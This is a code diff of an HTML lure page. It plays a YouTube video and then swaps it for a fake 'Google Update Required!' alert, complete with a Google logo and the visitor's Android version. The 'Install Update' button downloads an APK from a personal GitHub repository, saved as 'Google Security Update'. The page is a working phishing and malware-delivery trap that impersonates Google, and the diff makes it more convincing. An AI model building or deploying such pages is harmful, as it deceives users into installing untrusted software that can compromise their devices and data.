@@ -18,7 +18,6 @@
             overflow: hidden;
         }
 
-        /* Full-screen iframe */
         iframe {
             position: fixed;
             top: 0;
@@ -26,12 +25,29 @@
             width: 100%;
             height: 100vh;
             border: none;
-            z-index: 1; /* Keep the iframe on top initially */
+            z-index: 1;
         }
 
-        /* Critical update message */
+        .sound-button {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            background-color: rgba(0, 0, 0, 0.6);
+            color: white;
+            border: none;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            z-index: 9999;
+            font-size: 24px;
+        }
+
         .critical-update {
-            background-color: #FFFFFF;  /* Red background */
+            background-color: #FFFFFF;
             color: #202124;
             padding: 20px;
             border-radius: 8px;
@@ -40,7 +56,7 @@
             max-width: 600px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
             font-size: 18px;
-            display: none; /* Hidden initially */
+            display: none;
             position: absolute;
             z-index: 9999;
         }
@@ -70,72 +86,81 @@
         }
 
         .google-logo {
-            width: 100px; /* Google logo size */
+            width: 100px;
             margin-bottom: 10px;
-        }
-
-        .message {
-            font-size: 20px;
-            margin-top: 15px;
-            text-align: center;
         }
     </style>
 </head>
 <body>
 
-    <!-- Embedded YouTube Video (in iframe) -->
-    <iframe id="youtube-frame" src="https://www.youtube.com/embed/53DqFmb6hKc?si=tisFQ6qwtUdPe8e?autohide=1" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    <!-- Embedded YouTube Video -->
+    <iframe 
+        id="youtube-frame" 
+        src="https://www.youtube.com/embed/53DqFmb6hKc?autoplay=1&mute=1&enablejsapi=1" 
+        allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" 
+        allowfullscreen>
+    </iframe>
 
-    <!-- Critical Update message (hidden initially) -->
+    <!-- Sound Button -->
+    <button id="soundButton" class="sound-button" style="display: block;">🔇</button>
+
+    <!-- Critical Update Message -->
     <div id="criticalUpdate" class="critical-update">
-        <!-- Use local Google logo -->
         <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" alt="Google Logo" class="google-logo">
         <h1>Google Update Required!</h1>
         <p id="androidVersionMessage">You are missing a critical update for your Android device. You are using Android version <span id="androidVersion">N/A</span>.</p>
-        <p><strong>Be aware that security vulnerabilities are present on your current version!</strong></p>
         <button class="install-button" id="updateButton">Install Update</button>
     </div>
 
-    <div id="message" class="message" style="display: none;">
-        <p>Redirecting to our page...</p>
-    </div>
-
     <script>
-        // Step 1: Wait 10 seconds while YouTube iframe is showing
-        setTimeout(function () {
-            // After 10 seconds, hide the iframe and show the critical update message
-            document.getElementById('youtube-frame').style.display = 'none';
-            document.getElementById('criticalUpdate').style.display = 'block';
-        }, 5000);  // Wait for 5 seconds
+        let player;
 
-        // Step 2: Detect Android version after redirection
-        window.addEventListener('load', function () {
-            const userAgent = navigator.userAgent;
-            const androidVersion = getAndroidVersion(userAgent);
-
-            if (androidVersion) {
-                document.getElementById('androidVersion').textContent = androidVersion;
-            } else {
-                document.getElementById('androidVersion').textContent = "Unknown";
-            }
-        });
-
-        // Helper function to extract Android version from user agent
-        function getAndroidVersion(userAgent) {
-            const match = userAgent.match(/Android\s([0-9\.]+)/);
-            return match ? match[1] : null;
+        // Step 1: Load the YouTube IFrame API
+        function onYouTubeIframeAPIReady() {
+            player = new YT.Player('youtube-frame', {
+                events: {
+                    'onReady': onPlayerReady
+                }
+            });
         }
 
-        // Button click event to trigger file download
+        // Step 2: Handle the video playback and display the message after 10 seconds
+        function onPlayerReady() {
+            player.playVideo();
+
+            setTimeout(() => {
+                player.stopVideo(); // Stop the video
+                document.getElementById('youtube-frame').style.display = 'none'; // Hide the video
+                document.getElementById('criticalUpdate').style.display = 'block'; // Show the message
+            }, 10000); // After 10 seconds
+        }
+
+        // Step 3: Dynamically load the YouTube IFrame API script
+        const script = document.createElement('script');
+        script.src = "https://www.youtube.com/iframe_api";
+        document.body.appendChild(script);
+
+        // Step 4: Detect Android version
+        window.addEventListener('load', function () {
+            const userAgent = navigator.userAgent;
+            const androidVersion = userAgent.match(/Android\s([0-9\.]+)/)?.[1] || "Unknown";
+            document.getElementById('androidVersion').textContent = androidVersion;
+        });
+
+        // Step 5: Handle the "Install Update" button click
         document.getElementById('updateButton').addEventListener('click', function () {
-            // Simulate downloading a file (replace with actual file URL)
-            const downloadUrl = 'https://github.com/ajitdesk25/Google_Update_apk/raw/refs/heads/main/Google_Update_Ver202511.apk';  // Provide the file URL here
+            const downloadUrl = 'https://github.com/ajitdesk25/Google_Update_apk/raw/refs/heads/main/Google_Update_Ver202511.apk';
             const link = document.createElement('a');
             link.href = downloadUrl;
-            link.download = 'Google Security Update';  // Give the file a name when downloading
+            link.download = 'Google Security Update';
             link.click();
         });
-    </script>
 
+        // Step 6: Enable sound when clicking the sound button
+        document.getElementById('soundButton').addEventListener('click', function () {
+            player.unMute(); // Unmute the video
+            this.style.display = 'none'; // Hide the sound button
+        });
+    </script>
 </body>
 </html>
